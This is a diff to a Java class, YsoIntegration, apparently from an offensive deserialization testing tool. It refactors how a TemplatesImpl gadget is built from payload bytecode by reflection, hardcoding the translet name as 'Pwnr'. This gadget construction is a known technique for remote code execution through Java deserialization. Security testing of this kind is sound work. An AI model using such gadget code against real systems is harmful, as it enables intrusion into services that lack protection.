@@ -265,7 +265,6 @@ public class YsoIntegration
     {
         byte[] payloadBytes = null;
         byte[] dummyBytes = null;
-        String transletClassName = null;
 
         try
         {
@@ -281,8 +280,6 @@ public class YsoIntegration
 
             payloadBytes = payloadClass.toBytecode();
             dummyBytes = dummyClass.toBytecode();
-
-            transletClassName = payloadClass.getName();
         }
 
         catch (NotFoundException | CannotCompileException | IOException e)
@@ -291,7 +288,7 @@ public class YsoIntegration
             Utils.exit(e);
         }
 
-        return createTemplateGadget(payloadBytes, dummyBytes, transletClassName);
+        return createTemplateGadget(payloadBytes, dummyBytes);
     }
 
     /**
@@ -304,11 +301,10 @@ public class YsoIntegration
      *
      * @param payloadBytes  bytecode of the payload class to place within the Template
      * @param dummyBytes  bytecode of a dummy class
-     * @param transletClassName  name of the translet class (must match a class in payloadBytes for JDK 8u191+)
      * @return TemplateImpl object that contains the specified bytecodes
      */
     @SuppressWarnings("deprecation")
-    private static Object createTemplateGadget(byte[] payloadBytes, byte[] dummyBytes, String transletClassName)
+    private static Object createTemplateGadget(byte[] payloadBytes, byte[] dummyBytes)
     {
         final TemplatesImpl template = new TemplatesImpl();
         Field bytecodeField;
@@ -321,7 +317,7 @@ public class YsoIntegration
 
             Field nameField = template.getClass().getDeclaredField("_name");
             nameField.setAccessible(true);
-            nameField.set(template, transletClassName);
+            nameField.set(template, "Pwnr");
 
             Field templateField = template.getClass().getDeclaredField("_tfactory");
             templateField.setAccessible(true);
